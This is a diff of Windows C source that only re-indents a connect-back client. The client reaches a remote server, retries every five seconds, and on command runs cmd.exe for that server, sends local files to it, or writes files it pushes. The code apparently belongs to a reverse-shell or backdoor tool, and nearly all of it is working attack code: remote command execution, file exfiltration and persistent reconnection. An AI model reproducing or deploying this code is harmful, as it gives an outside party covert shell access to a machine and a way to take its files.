@@ -85,43 +85,43 @@ DWORD c_put (spp_ctx *c, char *path)
  *
  *F*/
 {
-  HANDLE  out;
-  DWORD   wn;
-  spp_blk in;
-  int     r;
-  
-  DEBUG_PRINT("creating %s", path);
-  
-  out=CreateFile (path, GENERIC_WRITE, 0, NULL, 
-    CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-  
-  // tell remote our last error
-  in.err=GetLastError();
-  in.len=sizeof(DWORD);
-  DEBUG_PRINT("error code %i", in.err);
-  r=spp_send(c, &in);
+    HANDLE  out;
+    DWORD   wn;
+    spp_blk in;
+    int     r;
     
-  // if unable to create
-  if (out!=INVALID_HANDLE_VALUE)
-  {
-    // keep looping until we receive zero length or socket error
-    for (;;) 
+    DEBUG_PRINT("creating %s", path);
+    
+    out=CreateFile (path, GENERIC_WRITE, 0, NULL, 
+      CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+    
+    // tell remote our last error
+    in.err=GetLastError();
+    in.len=sizeof(DWORD);
+    DEBUG_PRINT("error code %i", in.err);
+    r=spp_send(c, &in);
+      
+    // if unable to create
+    if (out!=INVALID_HANDLE_VALUE)
     {
-      // receive data, break on error
-      if ((r=spp_recv(c, &in)) != SPP_ERR_OK) 
-        break;
-      
-      // break if zero length
-      if (in.len==0) break;
-      
-      // else write to file
-      WriteFile (out, in.buf, in.len, &wn, 0);
+      // keep looping until we receive zero length or socket error
+      for (;;) 
+      {
+        // receive data, break on error
+        if ((r=spp_recv(c, &in)) != SPP_ERR_OK) 
+          break;
+        
+        // break if zero length
+        if (in.len==0) break;
+        
+        // else write to file
+        WriteFile (out, in.buf, in.len, &wn, 0);
+      }
+      // close handle
+      CloseHandle (out);
     }
-    // close handle
-    CloseHandle (out);
-  }
-  DEBUG_PRINT("c_put ending");
-  return r;
+    DEBUG_PRINT("c_put ending");
+    return r;
 }
 
 /**F*****************************************************************/
@@ -135,98 +135,98 @@ int dispatch (spp_ctx *c)
  *
  *F*/
 {
-  DWORD   e, terminate=0, end=0;
-  spp_blk in;
-  DWORD   sck_evt;
-  HANDLE  evt[MAXIMUM_WAIT_OBJECTS];
-  DWORD   evt_cnt=0;
-  
-  evt[sck_evt = evt_cnt++] = WSACreateEvent();
-  
-  do {
-    // wait for event
-    e=wait_evt(evt, evt_cnt, sck_evt, c->s);
+    DWORD   e, terminate=0, end=0;
+    spp_blk in;
+    DWORD   sck_evt;
+    HANDLE  evt[MAXIMUM_WAIT_OBJECTS];
+    DWORD   evt_cnt=0;
     
-    // failure? exit
-    if (e == -1) {
-      printf ("[ wait_evt() failure : returned %08X\n", e);
-      return 0;
-    }
-    // receive packet
-    if (spp_recv(c, &in) != SPP_ERR_OK) {
-      break;
-    }
-    // inspect packet
-    switch (in.cmd.opt)
-    {
-      // terminate client
-      case SPP_CMD_TERM : {
-        DEBUG_PRINT("received command to terminate");
-        terminate=1;
+    evt[sck_evt = evt_cnt++] = WSACreateEvent();
+    
+    do {
+      // wait for event
+      e=wait_evt(evt, evt_cnt, sck_evt, c->s);
+      
+      // failure? exit
+      if (e == -1) {
+        printf ("[ wait_evt() failure : returned %08X\n", e);
+        return 0;
+      }
+      // receive packet
+      if (spp_recv(c, &in) != SPP_ERR_OK) {
         break;
       }
-      // close the connection
-      case SPP_CMD_CLOSE : {
-        DEBUG_PRINT("received command to close connection");
-        end=1;
-        break;
+      // inspect packet
+      switch (in.cmd.opt)
+      {
+        // terminate client
+        case SPP_CMD_TERM : {
+          DEBUG_PRINT("received command to terminate");
+          terminate=1;
+          break;
+        }
+        // close the connection
+        case SPP_CMD_CLOSE : {
+          DEBUG_PRINT("received command to close connection");
+          end=1;
+          break;
+        }
+        // execute cmd.exe for remote server
+        case SPP_CMD_SHELL : {
+          DEBUG_PRINT("received command to execute cmd.exe");
+          cmd(c);
+          break;
+        }
+        // send a file to remote server
+        // buf should contain the name of file to open
+        case SPP_CMD_GET : {
+          DEBUG_PRINT("received command to send file");
+          c_get(c, in.cmd.buf);
+          break;
+        }
+        // receive a file from remote server
+        // buf should contain the name of file to create
+        case SPP_CMD_PUT : {
+          DEBUG_PRINT("received command to receive file");
+          c_put(c, in.cmd.buf);
+          break;
+        }
+        default:
+          DEBUG_PRINT("unknown command received %08X", in.cmd.opt);
+          break;
       }
-      // execute cmd.exe for remote server
-      case SPP_CMD_SHELL : {
-        DEBUG_PRINT("received command to execute cmd.exe");
-        cmd(c);
-        break;
-      }
-      // send a file to remote server
-      // buf should contain the name of file to open
-      case SPP_CMD_GET : {
-        DEBUG_PRINT("received command to send file");
-        c_get(c, in.cmd.buf);
-        break;
-      }
-      // receive a file from remote server
-      // buf should contain the name of file to create
-      case SPP_CMD_PUT : {
-        DEBUG_PRINT("received command to receive file");
-        c_put(c, in.cmd.buf);
-        break;
-      }
-      default:
-        DEBUG_PRINT("unknown command received %08X", in.cmd.opt);
-        break;
-    }
-    // continue until close or terminate
-  } while (!end && !terminate);
-  return terminate;
+      // continue until close or terminate
+    } while (!end && !terminate);
+    return terminate;
 }
   
 // connect to server
 void client(args_t *p)
 {
-  spp_ctx c;
-  int     term=0;
-  
-  do
-  {
-    // create socket
-    p->s=socket(p->ai_family, SOCK_STREAM, IPPROTO_TCP);
-    if (p->s!=SOCKET_ERROR)
+    spp_ctx c;
+    int     term=0;
+    
+    do
     {
-      printf ("[ connecting to %s\n", addr2ip(p));
-      if (connect (p->s, p->ai_addr, p->ai_addrlen)!=SOCKET_ERROR)
+      // create socket
+      p->s=socket(p->ai_family, SOCK_STREAM, IPPROTO_TCP);
+      if (p->s!=SOCKET_ERROR)
       {
-        printf ("[ connected\n");
-        c.s=p->s;
-        term = dispatch(&c);
-        printf ("[ closing connection\n");
-      } else {
-        xstrerror ("connect");
+        printf ("[ connecting to %s\n", addr2ip(p));
+        if (connect (p->s, p->ai_addr, p->ai_addrlen)!=SOCKET_ERROR)
+        {
+          printf ("[ connected\n");
+          c.s=p->s;
+          term = dispatch(&c);
+          printf ("[ closing connection\n");
+        } else {
+          xstrerror ("connect");
+        }
+        shutdown (p->s, SD_BOTH);
+        closesocket (p->s);
       }
-      shutdown (p->s, SD_BOTH);
-      closesocket (p->s);
-    }
-    if (!term) {
-      Sleep (5000); // sleep for 5 seconds, then try again
-    }
-  } while (!term);
+      if (!term) {
+        Sleep (5000); // sleep for 5 seconds, then try again
+      }
+    } while (!term);
 }
